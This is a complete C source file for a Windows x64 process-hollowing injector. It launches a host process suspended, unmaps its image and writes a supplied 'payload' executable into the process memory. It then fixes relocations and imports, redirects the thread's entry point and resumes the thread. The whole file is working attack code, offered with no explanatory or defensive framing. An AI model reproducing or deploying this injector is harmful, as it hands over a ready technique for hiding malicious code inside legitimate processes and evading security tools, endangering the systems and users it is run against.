#include <windows.h>
#include <stdio.h>

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS( NTAPI* NTUNMAPVIEWOFSECTION )(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress
    );



VOID Relocate( PBYTE imageBase, DWORD64 originalBase, DWORD64 newBase ) {

    PIMAGE_DOS_HEADER dosHeader = ( PIMAGE_DOS_HEADER )imageBase;
    PIMAGE_NT_HEADERS ntHeaders = ( PIMAGE_NT_HEADERS )( imageBase + dosHeader->e_lfanew );

    DWORD64 delta = newBase - originalBase;
    if ( delta == 0 ) return;


    DWORD relocRVA = ntHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].VirtualAddress;
    DWORD relocSize = ntHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].Size;
    if ( !relocRVA || !relocSize ) return;


    PIMAGE_BASE_RELOCATION reloc = ( PIMAGE_BASE_RELOCATION )( imageBase + relocRVA );
    DWORD processed = 0;
    while ( processed < relocSize && reloc->VirtualAddress ) {
        DWORD count = ( reloc->SizeOfBlock - sizeof( *reloc ) ) / sizeof( WORD );
        PWORD entry = ( PWORD )( ( PBYTE )reloc + sizeof( *reloc ) );
        PBYTE blockBase = imageBase + reloc->VirtualAddress;
        for ( DWORD i = 0; i < count; i++ ) {
            WORD type = entry[ i ] >> 12;
            WORD offset = entry[ i ] & 0xFFF;
            if ( type == IMAGE_REL_BASED_DIR64 ) {
                DWORD64* target = ( DWORD64* )( blockBase + offset );
                *target += delta;
            }
        }
        processed += reloc->SizeOfBlock;
        reloc = ( PIMAGE_BASE_RELOCATION )( ( PBYTE )reloc + reloc->SizeOfBlock );
    }

    return;
}

DWORD RvaToFile( PIMAGE_NT_HEADERS ntHeaders, DWORD rva ) {
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION( ntHeaders );
    for ( WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++ ) {
        if ( rva >= sectionHeader->VirtualAddress && rva < sectionHeader->VirtualAddress + sectionHeader->SizeOfRawData ) {
            return rva - sectionHeader->VirtualAddress + sectionHeader->PointerToRawData;
        }
    }
    return 0;
}

BOOL ResolveImports( HANDLE hProcess, DWORD64 baseAddr, PBYTE pImage ) {
    PIMAGE_DOS_HEADER dosHeader = ( PIMAGE_DOS_HEADER )pImage;
    PIMAGE_NT_HEADERS ntHeaders = ( PIMAGE_NT_HEADERS )( pImage + dosHeader->e_lfanew );

    DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;
    if ( !importRVA ) {
        printf( "[+] No imports to resolve\n" );
        return TRUE;
    }

    DWORD importOffset = RvaToFile( ntHeaders, importRVA );
    if ( !importOffset ) {
        printf( "[-] Failed to convert import RVA to file offset\n" );
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = ( PIMAGE_IMPORT_DESCRIPTOR )( pImage + importOffset );
    int dllCount = 0, fnCount = 0;

    for ( ; importDesc->Name; importDesc++ ) {
        // LPCSTR dllName = ( LPCSTR )( pImage + RvaToFile( ntHeaders, importDesc->Name ) );
        DWORD nameOffset = RvaToFile( ntHeaders, importDesc->Name );
        if ( !nameOffset ) {
            printf( "[-] Failed to convert import name RVA to file offset\n" );
            return FALSE;
        }
        LPCSTR dllName = ( LPCSTR )( pImage + nameOffset );
        HMODULE hDll = LoadLibraryExA( dllName, NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS );
        if ( !hDll ) {
            printf( "[-] LoadLibraryA failed for %s with error: %d\n", dllName, GetLastError() );
            return FALSE;
        }
        dllCount++;

        DWORD origRVA = importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk;
        DWORD origOffset = RvaToFile( ntHeaders, origRVA );
        if ( !origOffset ) {
            printf( "[-] Failed to convert original thunk RVA to file offset\n" );
            return FALSE;
        }
        PIMAGE_THUNK_DATA origThunk = ( PIMAGE_THUNK_DATA )( pImage + origOffset );

        DWORD iatOffset = RvaToFile( ntHeaders, importDesc->FirstThunk );
        if ( !iatOffset ) {
            printf( "[-] Failed to convert IAT RVA to file offset\n" );
            return FALSE;
        }

        for ( DWORD i = 0; origThunk[ i ].u1.AddressOfData; i++ ) {
            FARPROC procAddr = NULL;
            if ( origThunk[ i ].u1.Ordinal & IMAGE_ORDINAL_FLAG ) {
                procAddr = GetProcAddress( hDll, ( LPCSTR )( ULONG_PTR )( origThunk[ i ].u1.Ordinal & 0xFFFF ) );
            }
            else {
                DWORD ibnOffset = RvaToFile( ntHeaders, ( DWORD )origThunk[ i ].u1.AddressOfData );
                if ( !ibnOffset ) {
                    printf( "[-] Failed to convert import by name RVA to file offset\n" );
                    return FALSE;
                }
                PIMAGE_IMPORT_BY_NAME ibn = ( PIMAGE_IMPORT_BY_NAME )( pImage + ibnOffset );
                procAddr = GetProcAddress( hDll, ibn->Name );
            }
            if ( !procAddr ) {
                printf( "[-] GetProcAddress failed for %s in DLL %s (error: %lu)\n",
                    origThunk[ i ].u1.Ordinal & IMAGE_ORDINAL_FLAG ? "ordinal" : "function",
                    dllName,
                    GetLastError() );
                return FALSE;
            }
            DWORD64 slot = baseAddr + importDesc->FirstThunk + ( i * sizeof( DWORD64 ) );
            SIZE_T bytesWritten = 0;
            if ( !WriteProcessMemory( hProcess, ( LPVOID )slot, &procAddr, sizeof( procAddr ), &bytesWritten ) ) {
                printf( "[-] WriteProcessMemory failed for IAT entry with error: %d\n", GetLastError() );
                return FALSE;
            }
            fnCount++;
        }
    }
    printf( "[+] Resolved %d imports across %d DLLs\n", fnCount, dllCount );
    return TRUE;
}

int main( int argc, char* argv[] ) {

    if ( argc < 3 ) {
        printf( "[+] Usage: %s process_name exe_path\n", argv[ 0 ] );
        return 0;
    }

    LPSTR procName = argv[ 1 ];
    LPSTR exePath = argv[ 2 ];

    printf( "Process Name: %s\n", procName );
    printf( "Exe Path: %s\n", exePath );

    HANDLE hFile = CreateFileA( exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        printf( "[-] CreateFileA failed with error: %d\n", GetLastError() );
        return 1;
    }


    DWORD fileSize = GetFileSize( hFile, NULL );

    if ( fileSize == INVALID_FILE_SIZE || fileSize == 0 ) {
        printf( "[-] GetFileSize failed with error: %d\n", GetLastError() );
        CloseHandle( hFile );
        return 1;
    }

    PBYTE lpFileBuffer = ( PBYTE )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize );
    if ( lpFileBuffer == NULL ) {
        printf( "[-] HeapAlloc failed with error: %d\n", GetLastError() );
        CloseHandle( hFile );
        return 1;
    }

    DWORD bytesRead = 0;
    if ( !ReadFile( hFile, ( LPVOID )lpFileBuffer, fileSize, &bytesRead, NULL ) || bytesRead != fileSize ) {
        printf( "[-] ReadFile failed with error: %d\n", GetLastError() );
        HeapFree( GetProcessHeap(), 0, ( LPVOID )lpFileBuffer );
        CloseHandle( hFile );
        return 1;
    }

    CloseHandle( hFile );

    PIMAGE_DOS_HEADER dosHeader = ( PIMAGE_DOS_HEADER )lpFileBuffer;
    if ( dosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        printf( "[-] Invalid DOS signature\n" );
        HeapFree( GetProcessHeap(), 0, ( LPVOID )lpFileBuffer );
        return 1;
    }

    PIMAGE_NT_HEADERS ntHeaders = ( PIMAGE_NT_HEADERS )( lpFileBuffer + dosHeader->e_lfanew );
    if ( ntHeaders->Signature != IMAGE_NT_SIGNATURE ) {
        printf( "[-] Invalid NT signature\n" );
        HeapFree( GetProcessHeap(), 0, ( LPVOID )lpFileBuffer );
        return 1;
    }

    if ( ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ) {
        printf( "[-] Unsupported architecture. Only x64 is supported.\n" );
        HeapFree( GetProcessHeap(), 0, ( LPVOID )lpFileBuffer );
        return 1;
    }

    printf( "[+] Payload Size: %lu bytes, Preferred Base: 0x%llX, Entry RVA: 0x%lX\n",
        fileSize,
        ( unsigned long long )ntHeaders->OptionalHeader.ImageBase,
        ntHeaders->OptionalHeader.AddressOfEntryPoint );

    STARTUPINFOA si = { 0 };
    si.cb = sizeof( si );
    PROCESS_INFORMATION pi = { 0 };

    CHAR cmdLine[ MAX_PATH ];
    strcpy_s( cmdLine, sizeof( cmdLine ), procName );

    if ( !CreateProcessA( NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
        printf( "[-] CreateProcessA failed with error: %d\n", GetLastError() );
        HeapFree( GetProcessHeap(), 0, ( LPVOID )lpFileBuffer );
        return 1;
    }

    printf( "[+] Host Process Suspended: PID=%lu\n", pi.dwProcessId );


    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if ( !GetThreadContext( pi.hThread, &ctx ) ) {
        fprintf( stderr, "[!] GetThreadContext: %lu\n", GetLastError() );
        goto cleanup;
    }

    DWORD64 pebAddr = ctx.Rdx;
    DWORD64 imageBaseFieldAddr = pebAddr + 0x10;
    DWORD64 hostImageBase = 0;
    SIZE_T bytesRead2 = 0;
    if ( !ReadProcessMemory( pi.hProcess, ( LPCVOID )imageBaseFieldAddr, &hostImageBase, sizeof( hostImageBase ), &bytesRead2 ) ) {
        fprintf( stderr, "[!] ReadProcessMemory(PEB): %lu\n", GetLastError() );
        goto cleanup;
    }
    printf( "[+] Host PEB at 0x%llX, Image Base 0x%llX\n", ( unsigned long long )pebAddr, ( unsigned long long )hostImageBase );

    HMODULE hNtdll = GetModuleHandleA( "ntdll.dll" );

    NTUNMAPVIEWOFSECTION NtUnmapViewOfSection = ( NTUNMAPVIEWOFSECTION )GetProcAddress( hNtdll, "NtUnmapViewOfSection" );

    NTSTATUS status = NtUnmapViewOfSection( pi.hProcess, ( PVOID )hostImageBase );
    if ( !NT_SUCCESS( status ) ) {
        printf( "[-] NtUnmapViewOfSection failed with status: 0x%08lX\n", status );
        goto cleanup;
    }
    // printf( "[+] NtUnmapViewOfSection status=0x%08lX\n", status );

    DWORD64 baseAddress = ( DWORD64 )VirtualAllocEx( pi.hProcess, ( LPVOID )hostImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( !baseAddress ) {
        baseAddress = ( DWORD64 )VirtualAllocEx( pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        if ( !baseAddress ) {
            fprintf( stderr, "[!] VirtualAllocEx: %lu\n", GetLastError() );
            goto cleanup;
        }
    }

    printf( "[+] New Base Address: 0x%llX\n", ( unsigned long long )baseAddress );

    Relocate( ( PBYTE )lpFileBuffer, ntHeaders->OptionalHeader.ImageBase, baseAddress );

    SIZE_T bytesWritten = 0;
    if ( !WriteProcessMemory( pi.hProcess, ( LPVOID )baseAddress, lpFileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten ) ) {
        fprintf( stderr, "[!] WriteProcessMemory: %lu\n", GetLastError() );
        goto cleanup;
    }

    PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION( ntHeaders );
    for ( WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeaders++ ) {
        DWORD64 sectionBase = baseAddress + sectionHeaders->VirtualAddress;
        if ( sectionHeaders->SizeOfRawData == 0 ) continue;
        LPVOID dest = ( LPVOID )( baseAddress + sectionHeaders->VirtualAddress );
        if ( !WriteProcessMemory( pi.hProcess, dest, lpFileBuffer + sectionHeaders->PointerToRawData, sectionHeaders->SizeOfRawData, &bytesWritten ) ) {
            fprintf( stderr, "[!] WriteProcessMemory(section %s): %lu\n", sectionHeaders->Name, GetLastError() );
            goto cleanup;
        }
    }

    if ( !ResolveImports( pi.hProcess, baseAddress, ( PBYTE )lpFileBuffer ) ) {
        fprintf( stderr, "[!] Failed to resolve imports\n" );
        goto cleanup;
    }

    if ( baseAddress != ntHeaders->OptionalHeader.ImageBase ) {
        WriteProcessMemory( pi.hProcess, ( LPVOID )( imageBaseFieldAddr ), &baseAddress, sizeof( baseAddress ), &bytesWritten );
    }

    ctx.Rcx = baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    if ( !SetThreadContext( pi.hThread, &ctx ) ) {
        fprintf( stderr, "[!] SetThreadContext: %lu\n", GetLastError() );
        goto cleanup;
    }

    if ( !ResumeThread( pi.hThread ) ) {
        fprintf( stderr, "[!] ResumeThread: %lu\n", GetLastError() );
        goto cleanup;
    }

    printf( "[+] Resumed Hollowed Process: PID=%lu\n", pi.dwProcessId );

    WaitForSingleObject( pi.hProcess, INFINITE );

cleanup:
    if ( pi.hThread ) {
        CloseHandle( pi.hThread );
    }
    if ( pi.hProcess ) {
        CloseHandle( pi.hProcess );
    }
    if ( lpFileBuffer ) {
        HeapFree( GetProcessHeap(), 0, ( LPVOID )lpFileBuffer );
    }
    return 0;
}